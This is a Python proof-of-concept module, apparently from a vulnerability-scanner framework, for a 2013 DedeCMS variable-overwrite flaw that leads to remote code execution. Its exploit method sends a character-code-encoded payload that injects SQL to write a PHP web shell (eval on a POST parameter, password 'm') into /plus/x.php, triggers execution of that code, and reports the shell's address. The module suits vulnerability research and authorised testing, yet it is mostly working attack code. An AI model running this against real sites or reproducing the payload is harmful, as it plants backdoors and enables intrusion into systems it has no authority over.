# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0033'  # 平台漏洞编号，留空
    name = 'DedeCMS getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-06-07'  # 漏洞公布时间
    desc = '''
        DedeCMS include/dedesql.class.php 中全局变量$GLOBALS可以被任意修改。

        1. "/plus/download.php"文件会引入"/include/common.inc.php"文件
        2. "/include/common.inc.php"中会对用户输入的变量进行"变量本地注册"，如果注册的变量未被显式地初始化，则会导致本地变量覆盖
        3. "/include/common.inc.php"会引入"/include/dedesql.class.php"文件
        4. 存在漏洞的"/include/dedesql.class.php"，"没有"对$arrs1、$arrs2这两个数组进行初始化，导致黑客可以通过外部的输入覆盖这2个变量
        5. 黑客通过向"/plus/download.php"文件中POST入特殊构造的数据包，通过覆盖$arrs1、$arrs2这两个数组，最终污染"数据表前缀变量$cfg_"，这个"数据表前缀变量$cfg_"会被带入数据库的SQL查询语句中，导致SQL注入
        6. "/plus/ad_js.php"、"/plus/mytag_js.php"会从数据库中查询出刚才被注入的PHP Code，将写过写入缓存文件中，并include执行，最终导致代码执行
    '''  # 漏洞描述
    ref = 'https://www.unhonker.com/bug/1272.html，http://www.cnblogs.com/LittleHann/p/4236517.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '20130425'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'adbc4272-3db6-4ad4-957b-46d76a2f3414'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 查看软件版本
            payload = '/data/admin/ver.txt'
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and '20130425' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 会在plus目录生成 x.php 密码 m
            # http://127.0.0.1/plus/x.php
            payload = "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=120&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=109&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35"
            url = self.target + payload

            requests.post(url)
            requests.get(self.target + '/plus/mytag_js.php?aid=1')

            url1 = self.target + '/plus/x.php'
            r = requests.get(url1)

            if r.status_code == 200:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，，已上传webshell地址:{url}密码为m,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=url1))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
